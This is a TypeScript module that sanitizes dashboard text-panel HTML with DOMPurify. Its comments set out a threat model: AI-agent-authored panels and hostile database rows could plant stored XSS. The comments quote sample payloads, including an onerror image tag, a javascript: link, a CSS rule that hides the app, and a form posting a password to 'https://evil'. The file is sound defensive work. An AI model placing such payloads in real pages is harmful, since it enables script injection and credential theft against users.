/**
 * The one place a text panel's content becomes HTML.
 *
 * `TextPanel` injects this through `dangerouslySetInnerHTML`, so everything that
 * reaches the DOM from a panel's `options.content` passes here first.
 *
 * **Why sanitizing is required rather than tidy.** `marked` does not sanitize —
 * `<img src=x onerror=...>` and `[click](javascript:alert(1))` both survive it
 * verbatim — and panel content is no longer only author-written. The AI chat
 * feature (DO-313) previews an agent-authored dashboard through the same renderer,
 * and every agent dashboard ships a `text` panel; the backend's `validateDashboard`
 * short-circuits `type === 'text'` and never inspects `options.content`. The agent
 * also reads rows of the customer's IoT database while writing SQL, so a hostile row
 * is a plausible source with no malicious user involved. `auth_token` lives in
 * localStorage and its JWT carries both Postgres URLs in cleartext, and Apply
 * persists the panel verbatim — so an unsanitized panel is stored XSS that re-fires
 * on every later open of the report, not a one-off in a dialog.
 *
 * Sanitizing HERE, at the render seam, covers the preview, the applied report and
 * every dashboard that already exists. Filtering text panels out of the preview
 * would not: it leaves the saved report exposed and breaks the invariant that the
 * previewed bytes are the saved bytes.
 *
 * The chat bubble solves the same problem structurally instead — see
 * src/components/ai-chat/markdown.ts, which builds React elements and never
 * constructs an HTML string at all. That remains the stronger pattern; it is not
 * available here because panels legitimately carry author-written HTML.
 */
import DOMPurify, { type Config } from 'dompurify';
import { marked } from 'marked';

/** Matches the options TextPanel has always parsed with. */
const MARKED_OPTIONS = { breaks: true, gfm: true } as const;

/**
 * What the sanitizer allows, and what it does not. Every entry was measured against
 * the installed DOMPurify rather than assumed (!64 review round 3).
 *
 * - **No `FORCE_BODY`, deliberately.** Without it `DOMParser` hoists a LEADING
 *   `<style>`/`<title>`/`<meta>` into `<head>` and DOMPurify returns only `body`, so
 *   a tag could survive after text and vanish before it — policy must not depend on
 *   where in the string a tag sits. `FORBID_TAGS` below settles that far better: with
 *   `<style>` refused everywhere, and every other head-hoistable tag already outside
 *   the default allow-list, the position question has no observable answer left.
 *   `FORCE_BODY` would change no output today, and an option no test can distinguish
 *   is an option nobody can maintain. **Re-add it the moment `<style>` is allowed
 *   back in** — that is the one change that makes the asymmetry visible again.
 * - `ADD_ATTR: ['target']` — `target` is not in the default allow-list, so an author's
 *   `<a target="_blank">` silently became an in-place navigation. We render inside a
 *   cross-origin iframe in the Navixy host, so that navigates the embedded dashboard
 *   away with no in-app way back. The hook below then forces `rel` on it.
 * - `FORBID_TAGS`/`FORBID_ATTR` — the defaults stop SCRIPT EXECUTION; they are not a
 *   general "safe HTML" guarantee. `<style>`, the `style` attribute and a whole
 *   `<form>` all survive them, and a panel is a DISPLAY surface: a document-wide
 *   `<style>` can hide the app (`#root>*{display:none}`), a `position:fixed` inline
 *   style can cover it, and a `<form action="https://evil">` with a password input is
 *   a credential prompt inside the product. nginx sets only `frame-ancestors *` — no
 *   `form-action`, no `default-src` — so nothing downstream blocks the POST. None of
 *   this needs a malicious USER: the agent authors panel content and reads customer
 *   rows while doing it, and Apply persists the panel into the report view, where
 *   (unlike the preview dialog) no transform clamps a fixed-position element.
 *
 * Both FORBID_* lists are SUBTRACTIVE, deliberately: the bypass class this file
 * worries about is `ADD_TAGS`/`USE_PROFILES`/hook customisation widening the allow
 * list, and narrowing cannot widen it. Cost, stated plainly: a text panel can no
 * longer carry its own CSS. Zero of the 19 text panels across the 14 shipped fixtures
 * use `<style>`, a `style` attribute, `target` or a form — and Tailwind utility
 * classes still work, since `class` survives.
 */
const SANITIZE_CONFIG: Config = {
  ADD_ATTR: ['target'],
  FORBID_TAGS: ['style', 'form', 'input', 'button', 'select', 'textarea'],
  FORBID_ATTR: ['style'],
};

let hookInstalled = false;

/**
 * `target="_blank"` without `rel` hands the opened page a `window.opener` handle.
 * DOMPurify's own documented remedy is this hook; it only sets an attribute on an
 * already-sanitized node and never touches the allow-lists, which is the mutation
 * that its published hook advisories are about.
 */
function installRelHook() {
  if (hookInstalled) return;
  hookInstalled = true;
  DOMPurify.addHook('afterSanitizeAttributes', (node) => {
    if (node instanceof Element && node.hasAttribute('target')) {
      node.setAttribute('rel', 'noopener noreferrer');
    }
  });
}

const escapeHtml = (text: string) =>
  text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');

/**
 * Render a text panel's content as HTML that is safe to inject.
 *
 * @param mode `'markdown'` parses first; `'html'` sanitizes the content as given.
 *
 * See SANITIZE_CONFIG above for what is allowed and what is not, and why each entry
 * is there. The claim this function makes is narrow and worth stating exactly: the
 * output cannot execute script, navigate to a `javascript:` URL, restyle the
 * application, or collect input. It is not a claim that arbitrary HTML round-trips.
 *
 * Fails CLOSED. Without a DOM (a non-browser runtime, a test outside jsdom)
 * DOMPurify cannot sanitize and reports `isSupported: false` — in that case the
 * content is escaped to text rather than passed through, because silently returning
 * unsanitized HTML is the one outcome this function exists to prevent.
 */
export function toSafePanelHtml(content: string, mode: 'markdown' | 'html'): string {
  const rendered = mode === 'html'
    ? content
    : (marked.parse(content, MARKED_OPTIONS) as string);

  if (!DOMPurify.isSupported) {
    return escapeHtml(content);
  }
  installRelHook();
  // Typed as string | TrustedHTML because the overload allows RETURN_TRUSTED_TYPE;
  // SANITIZE_CONFIG never sets it, so this is always a string at runtime.
  return DOMPurify.sanitize(rendered, SANITIZE_CONFIG) as string;
}
